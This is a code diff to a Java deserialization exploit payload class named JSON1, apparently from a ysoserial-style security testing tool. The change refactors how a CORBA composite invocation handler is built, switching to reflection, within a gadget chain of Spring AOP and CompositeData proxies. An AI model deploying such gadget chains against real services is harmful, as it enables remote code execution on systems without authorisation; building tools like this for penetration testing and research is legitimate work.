@@ -22,7 +22,6 @@ import javax.management.openmbean.TabularType;
 import javax.xml.transform.Templates;
 
 import org.springframework.aop.framework.AdvisedSupport;
-import com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl;
 import net.sf.json.JSONObject;
 
 
@@ -95,12 +94,11 @@ public class JSON1 implements ObjectPayload<Object> {
         // it's very likely that there are other proxy impls that could be used
         AdvisedSupport as = new AdvisedSupport();
         as.setTarget(payload);
-        InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections
-                .getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy").newInstance(as);
+        InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", as);
         InvocationHandler cdsInvocationHandler = Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getCompositeType", rt));
-        CompositeInvocationHandlerImpl invocationHandler = new CompositeInvocationHandlerImpl();
-        invocationHandler.addInvocationHandler(CompositeData.class, cdsInvocationHandler);
-        invocationHandler.setDefaultHandler(delegateInvocationHandler);
+        InvocationHandler invocationHandler = (InvocationHandler) Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl");
+        ((Map) Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(CompositeData.class, cdsInvocationHandler);
+        Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);
         final CompositeData cdsProxy = Gadgets.createProxy(invocationHandler, CompositeData.class, ifaces);
 
         JSONObject jo = new JSONObject();
